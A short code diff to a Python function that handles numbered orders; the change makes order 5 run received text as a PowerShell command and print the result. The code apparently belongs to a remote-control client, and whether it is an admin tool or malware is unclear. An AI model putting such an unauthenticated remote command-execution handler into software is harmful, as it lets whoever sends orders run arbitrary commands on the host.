@@ -55,7 +55,7 @@ def execute_order(order, additional_data_received = ""):
 
   elif order == str(5):
     try:
-      list_arguments = additional_data_received.strip().split()
+      list_arguments = ["powershell.exe"] + additional_data_received.strip().split()
       print("Command Input : ",list_arguments)
       result_command = subprocess.run(list_arguments, capture_output=True, check=True).stdout
       print("Result command : ", result_command)
